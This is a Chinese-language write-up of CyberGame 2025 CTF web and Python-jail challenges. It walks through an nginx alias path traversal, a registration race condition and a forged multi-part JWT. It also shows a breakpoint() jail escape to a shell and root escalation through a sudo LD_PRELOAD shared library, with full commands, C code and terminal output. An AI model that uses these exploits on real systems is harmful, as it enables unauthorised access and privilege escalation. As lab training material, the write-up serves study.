# CyberGame 2025 Web Writeup-先知社区

> **来源**: https://xz.aliyun.com/news/18226  
> **文章ID**: 18226

---

## **[★★☆] Equestria - Door To The Stable**

### **Points: 6**

We are suspecting that the website on <http://exp.cybergame.sk:7000/> is hiding something. We need to find out what is hidden in the website. We've gathered what seems to be a proxy configuration file from our trusted source.

[nginx.conf](https://ctf-world.cybergame.sk/files/75d67a183633d3343f8d52845a6d295b/nginx.conf?token=eyJ1c2VyX2lkIjo5NDEsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjR9.aC1-9Q.hsK4Zjohqdk6fZ-Nl5J_-FEEFs4)

题目提供了一个`nginx.conf`

```
events {
    worker_connections 1024;
}

http {
    include mime.types;

    server {
        listen 80;
        server_name localhost;

        root /app/src/html/;
        index index.html;

        location /images {
            alias /app/src/images/;
            autoindex on;
        }

        location /ponies/ {
            alias /app/src/ponies/;
        }

        location /resources/ {
            alias /app/src/resources/;
        }

        location /secretbackend/ {
            proxy_pass http://secretbackend:3000/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }
    }
}

```

访问了以上所有路径其中root是静态页面，images可以访问到图像目录，结合题目描述目标目标应该是进入secretbackend，secretbackend需要提供账号密码，尝试一般的路径穿越找.htpasswd不成功

### **任意文件读取/目录遍历**

题目给了nginx的配置文件，猜测是有和nginx有关的漏洞，找到了nginx反向代理不安全配置导致的任意文件读取/目录遍历

[Nginx 不安全配置导致的漏洞 - zpchcbd - 博客园](https://www.cnblogs.com/zpchcbd/p/12654984.html)

这里的`/images`别名是`/app/src/images/`如果访问`/images..`那么实际访问的路径是`/app/src/images/..`

如果配置为`/images/`就不会有这个问题

访问

<http://exp.cybergame.sk:7000/images../>

路径穿越成功

![image 1.png](images/img_18226_000.png)

<http://exp.cybergame.sk:7000/images../secretbackend/>

![image 2.png](images/img_18226_001.png)

<http://exp.cybergame.sk:7000/images../secretbackend/index.js>

![image 3.png](images/img_18226_002.png)

`index.js`中有进入secretbackend的账号密码`cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9`

base64解密得

`pr1ncess:SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}`

得到flag

`SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}`

## **[★★☆] Equestria - Shadow Realm**

### **Points: 6**

The secret website is protected by a login page. Can you find a way to get in?

### 条件竞争

用`pr1ncess:SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}` 登录后可以看到一些输入框，上面的是注册，下面的是登录

![image 4.png](images/img_18226_003.png)

用上一题的任意文件读取查看`index.js`

```
const express = require("express");
const path = require("path");
const cookieParser = require("cookie-parser");
const { createToken, verifyToken } = require("./jwt");
const { dbAsync, initDb } = require("./db");

initDb();

const app = express();

app.use((req, res, next) => {
  if (
    req.headers.authorization !==
    "Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9"
  ) {
    res.setHeader("WWW-Authenticate", 'Basic realm="Secure Stable Area"');
    return res.status(401).send("Unauthorized");
  }
  next();
});

app.use(express.json());
app.use("/", express.static("public"));
app.use(cookieParser());

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function sendEmailToAdministrator(userId, username) {
  // TODO: Implement email sending. We'll just sleep until then.
  await sleep(1000);
  console.log(`đź¦„ Dark Council notified about new subject: ${username}`);
  return true;
}

app.post("/api/register", async (req, res) => {
  try {
    const { username, password, email } = req.body;

    const { rows } = await dbAsync.query(
      "INSERT INTO users (username, password, email) VALUES ($1, $2, $3) RETURNING id",
      [username, password, email]
    );

    const userId = rows[0].id;
    await sendEmailToAdministrator(userId, username);

    await dbAsync.query("UPDATE users SET verified = false WHERE id = $1", [
      userId,
    ]);

    return res.json({
      success: true,
      message:
        "Welcome to the Dark Stable. The Council will judge your worthiness.",
    });
  } catch (err) {
    if (err.constraint === "users_username_key") {
      return res.status(400).json({ error: "Username already exists" });
    }
    res.status(500).json({ error: "Registration failed", msg: err.message });
  }
});

app.post("/api/login", async (req, res) => {
  try {
    const { username, password } = req.body;
    const { rows } = await dbAsync.query(
      "SELECT id, username, verified FROM users WHERE username = $1 AND password = $2",
      [username, password]
    );

    if (rows.length === 0) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const user = rows[0];
    if (!user.verified) {
      return res
        .status(401)
        .json({ error: "The Dark Council has not approved you yet" });
    }

    const token = createToken({
      id: user.id,
      username: user.username,
    });

    res.cookie("token", token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "strict",
    });

    return res.json({
      success: true,
      welcome_msg: process.env.LOGIN_WELCOME_MESSAGE,
    });
  } catch (err) {
    return res.status(500).json({ error: "Login failed" });
  }
});

function authMiddleware(req, res, next) {
  const token = req.cookies.token;
  if (!token) return res.status(401).json({ error: "No token provided" });

  const payload = verifyToken(token);
  if (!payload) {
    return res.status(401).json({ error: "Invalid token" });
  }

  req.user = payload;
  next();
}

app.get("/api/secret-note", authMiddleware, async (req, res) => {
  if (req.user.is_d4rk_pr1nc3ss) {
    return res.send(process.env.DARK_PRINCESS_SECRET);
  }
  return res.send("You are not the Dark Princess");
});

function filterSQLChars(input) {
  return input.replace(/['";\=()\/
\r ]/g, "").replaceAll("--", "");
}

app.get("/api/notes", authMiddleware, async (req, res) => {
  try {
    const q = "SELECT * FROM notes WHERE user_id = '{{user_id}}'".replace(
      "{{user_id}}",
      filterSQLChars(req.user.id)
    );
    const { rows } = await dbAsync.query(q);
    return res.json(rows);
  } catch (err) {
    return res.status(500).json({ error: "Query failed", err: err.message });
  }
});

app.post("/api/notes", authMiddleware, async (req, res) => {
  try {
    const { content } = req.body;
    const { rows } = await dbAsync.query(
      "INSERT INTO notes (user_id, content) VALUES ($1, $2) RETURNING id",
      [req.user.id, content]
    );
    return res.json({ id: rows[0].id });
  } catch (err) {
    return res.status(500).json({ error: "Failed to create note" });
  }
});

app.post("/api/logout", (req, res) => {
  res.clearCookie("token");
  return res.json({ success: true });
});

app.listen(3000, () => console.log("Server running on port 3000"));

```

查看login的流程，在login中如果用自己注册的用户登录会得到”The Dark Council has not approved you yet”的error，函数直接返回无法登录，这是因为`user.verified`在登录时为`false`

```
    const { username, password } = req.body;
    const { rows } = await dbAsync.query(
      "SELECT id, username, verified FROM users WHERE username = $1 AND password = $2",
      [username, password]
    );

    if (rows.length === 0) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const user = rows[0];
    if (!user.verified) {
      return res
        .status(401)
        .json({ error: "The Dark Council has not approved you yet" });
    }

```

查看register，注册时数据首先会加入数据库，然后再经过了`sendEmailToAdministrator`之后`vertified`属性才被设置为false

```
    const { username, password, email } = req.body;

    const { rows } = await dbAsync.query(
      "INSERT INTO users (username, password, email) VALUES ($1, $2, $3) RETURNING id",
      [username, password, email]
    );

    const userId = rows[0].id;
    await sendEmailToAdministrator(userId, username);

    await dbAsync.query("UPDATE users SET verified = false WHERE id = $1", [
      userId,
    ]);
```

而在`db.js`中初始化时这个值是设置为true的

```
    await dbAsync.query(`
      CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

      CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY DEFAULT uuid_generate_v4(),
        username TEXT UNIQUE,
        password TEXT,
        email TEXT,
        verified BOOLEAN DEFAULT true
      );
      
      CREATE TABLE IF NOT EXISTS notes (
        id SERIAL PRIMARY KEY,
        user_id TEXT REFERENCES users(id),
        content TEXT
      );
    `);
```

注册之后在`verified`被修改之前立马登录即可，登录后没找到flag，查看login登录成功后的代码发现返回了一个环境变量中的`LOGIN_WELCOME_MESSAGE`可能包含提示

```
    return res.json({
      success: true,
      welcome_msg: process.env.LOGIN_WELCOME_MESSAGE,
    });
```

抓包查看

![image 5.png](images/img_18226_004.png)

得到flag

`SK-CERT{r4c3_4g41n5t_th3_l1ght_4nd_w1n_w1th_th3_p0w3r_0f_th3_n1ght}`

## **[★★☆] Equestria - The Dark Ruler**

### **Points: 6**

There seems to be an endpoint that is only accessible by a privileged user. Can you find a way to access it?

### JWT

根据题目描述应该是指的这个`/api/secret-note`只能被Dark Princess访问

```
app.get("/api/secret-note", authMiddleware, async (req, res) => {
  if (req.user.is_d4rk_pr1nc3ss) {
    return res.send(process.env.DARK_PRINCESS_SECRET);
  }
  return res.send("You are not the Dark Princess");
});
```

`req.user.is_d4rk_pr1nc3ss`是从token里面解析出来的，但是不知道生成token所用的密钥

这里能往数据库插入数据但是没有什么用

![image 6.png](images/img_18226_005.png)

```
app.post("/api/notes", authMiddleware, async (req, res) => {
  try {
    const { content } = req.body;
    const { rows } = await dbAsync.query(
      "INSERT INTO notes (user_id, content) VALUES ($1, $2) RETURNING id",
      [req.user.id, content]
    );
    return res.json({ id: rows[0].id });
  } catch (err) {
    return res.status(500).json({ error: "Failed to create note" });
  }
});
```

这里有sql注入但是user\_id是随机生成的无法控制

```
app.get("/api/secret-note", authMiddleware, async (req, res) => {
  if (req.user.is_d4rk_pr1nc3ss) {
    return res.send(process.env.DARK_PRINCESS_SECRET);
  }
  return res.send("You are not the Dark Princess");
});

function filterSQLChars(input) {
  return input.replace(/['";\=()\/
\r ]/g, "").replaceAll("--", "");
}

app.get("/api/notes", authMiddleware, async (req, res) => {
  try {
    const q = "SELECT * FROM notes WHERE user_id = '{{user_id}}'".replace(
      "{{user_id}}",
      filterSQLChars(req.user.id)
    );
    const { rows } = await dbAsync.query(q);
    return res.json(rows);
  } catch (err) {
    return res.status(500).json({ error: "Query failed", err: err.message });
  }
});
```

查看源码中`jwt.js`

```
const crypto = require("crypto");
const { v4 } = require("uuid");

const JWT_SECRET = v4();

function createToken(payload) {
  const base64Payload = Buffer.from(JSON.stringify(payload)).toString("base64");
  const signature = crypto
    .createHmac("sha256", JWT_SECRET)
    .update(base64Payload)
    .digest("base64");

  return `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.${base64Payload}.${signature}`;
}

function verifyToken(token) {
  const parts = token.split(".");
  if (parts.length < 3) return null;

  const payload = parts[1];
  const signature = parts[parts.length - 1];

  const expectedSignature = crypto
    .createHmac("sha256", JWT_SECRET)
    .update(parts[parts.length - 2])
    .digest("base64");

  if (signature === expectedSignature) {
    return JSON.parse(Buffer.from(payload, "base64").toString());
  }
  return null;
}

module.exports = {
  createToken,
  verifyToken,
};
```

JWT的格式是header.base64Payload.signature以`.`分隔开3个部分

[JSON Web Tokens - jwt.io](https://jwt.io/)这是一个例子

![image 7.png](images/img_18226_006.png)

而上面的`verifyToken` 函数用`.`把token分成了几个部分，return的payload是第2个部分，用于校验的payload则是倒数第二部分，正常情况下jwt只有3个部分返回的payload和用于校验的payload是一样的，而我们可以尝试构造以下token

```
header.evilpayload.payload.signature
```

先登录一个账号获得合法token，把自己构造的payload插入其中，`evilpayload`包含`is_d4rk_pr1nc3ss` 其他的不变

`token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjA1Y2E2YTYxLTU1ZWYtNDhiOS1hMDIyLWFhNzkyMjgxMWE1ZCIsInVzZXJuYW1lIjoiMSJ9.9EmcLen454EZrGwS%2FeBFjMF57VvZBt9vQWH6qwn6uZE%3D`

把中间一段拿出来base64解码

![image 8.png](images/img_18226_007.png)

修改数据

```
{"id":"05ca6a61-55ef-48b9-a022-aa7922811a5d","username":"1","is_d4rk_pr1nc3ss":1}
```

重新编码后加入原来的token

![image 9.png](images/img_18226_008.png)

`token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjA1Y2E2YTYxLTU1ZWYtNDhiOS1hMDIyLWFhNzkyMjgxMWE1ZCIsInVzZXJuYW1lIjoiMSIsImlzX2Q0cmtfcHIxbmMzc3MiOjF9.eyJpZCI6IjA1Y2E2YTYxLTU1ZWYtNDhiOS1hMDIyLWFhNzkyMjgxMWE1ZCIsInVzZXJuYW1lIjoiMSJ9.9EmcLen454EZrGwS%2FeBFjMF57VvZBt9vQWH6qwn6uZE%3D`

得到flag![image 10.png](images/img_18226_009.png)

`SK-CERT{1_w1ll_rul3_th3_n1ght_4nd_th3_d4y}`

## **[★★☆] JAILE - Calculator**

### **Points: 6**

You have found an exposed calculator program. It doesn’t seem to do anything useful beyond simple arithmetic operations. The source code is also available on GitHub. Can you make this application more useful? Python version is 3.12.3

Service: exp.cybergame.sk:7002

[calc.py](https://ctf-world.cybergame.sk/files/14bfeba338752115e61f54d22de26b5c/calc.py?token=eyJ1c2VyX2lkIjo5NDEsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEzfQ.aBzFvw.Pg8aEAH9XB6AqF1cdo6tV15wFIQ)

### **Python Jail沙箱逃逸**

`breakpoint()`绕过过滤，直接getshell

```
└─$ nc exp.cybergame.sk 7002
>> breakpoint()
None
--Return--
> <string>(1)<module>()->None
(Pdb) print(__import__('os').system('id'))
uid=1000(calc) gid=1000(calc) groups=1000(calc)
0
(Pdb) print(__import__('os').system('ls'))
flag.txt
main.py
0
(Pdb) print(__import__('os').system('cat flag.txt'))
SK-CERT{35c3p1ng_py7h0n_15_345y_745k}
0
(Pdb)
```

## **[★★☆] JAILE - User**

### **Points: 6**

That is interesting functionality. We can see that a separate user was created to run the calculator, but maybe the root user has more secrets that can be uncovered.

### 提权

flag在root里，需要提权

打开sh

```
print(__import__('os').system('sh'))
```

`sudo -l` 查看可用的命令

```
Matching Defaults entries for calc on ab4e9ebaf17e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty, env_keep+=LD_PRELOAD

User calc may run the following commands on ab4e9ebaf17e:
    (ALL) NOPASSWD: /bin/netstat
```

可以利用 `LD_PRELOAD` 注入任意动态链接库到 `netstat` 中执行任意代码比如启动 shell

`file /bin/netstat` 查看netstat

```
/bin/netstat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e37bb48f7f1b40c586917165272ed4b0aaf95475, for GNU/Linux 3.2.0, stripped
```

显示`dynamically linked` 支持`LD_PRELOAD` 注入

`shell.c`如下，这里要用`-i` 启动交互脚本，不然用不了

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void preload() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-i", NULL);
}
```

编译共享库

```
gcc -fPIC -shared -o /tmp/shell.so shell.c
```

执行，获取root

```
sudo LD_PRELOAD=/tmp/shell.so /bin/netstat
```

flag在/root目录下

```
└─$ nc  exp.cybergame.sk 7002
>> breakpoint()
None
--Return--
> <string>(1)<module>()->None
(Pdb) print(__import__('os').system('sh'))
file /bin/netstat
/bin/netstat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e37bb48f7f1b40c586917165272ed4b0aaf95475, for GNU/Linux 3.2.0, stripped
mkdir /tmp/fakebin
cat >/tmp/fakebin/netstat <<EOF
#!/bin/sh
/bin/sh
EOF
chmod +x /tmp/fakebin/netstat
sudo PATH=/tmp/fakebin:$PATH netstat
sudo: sorry, you are not allowed to set the following environment variables: PATH
cat > shell.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void preload() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-i", NULL);
}
EOF
gcc -fPIC -shared -o /tmp/shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so /bin/netstat
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@ab4e9ebaf17e:/home/calc# ls /root
ls /root
flag.txt
root@ab4e9ebaf17e:/home/calc# cat /root/flag.txt
cat /root/flag.txt
SK-CERT{r007_u53r_pr3l04d3d_pr1v1l3635}
```

`SK-CERT{r007_u53r_pr3l04d3d_pr1v1l3635}`
